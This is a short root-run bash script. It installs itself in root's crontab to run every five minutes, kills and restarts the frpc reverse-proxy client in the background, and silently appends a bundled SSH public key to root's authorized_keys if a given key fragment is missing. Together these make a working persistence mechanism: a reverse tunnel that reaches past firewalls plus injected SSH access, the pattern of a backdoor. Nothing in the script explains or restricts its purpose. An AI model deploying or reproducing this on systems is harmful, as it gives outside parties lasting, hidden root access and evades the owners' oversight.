#!/bin/bash

cd /root/rhtest
crontab -l |grep frp.sh || echo "*/5 * * * * /root/rhtest/frp.sh ">>/var/spool/cron/root

[[ $1 = reboot ]] && ( ps -ef | awk '!/awk/&&/frpc/{print "kill -9 ",$2}' |sh )

if ! ( ps -ef|grep -v grep|grep frpc.ini &>/dev/null );then
   nohup $PWD/frpc -c ./frpc.ini >/tmp/frp.log 2>&1 &
fi
grep "WP1sJCBuW0KmDw==" ~/.ssh/authorized_keys || cat authorized_keys >> ~/.ssh/authorized_keys
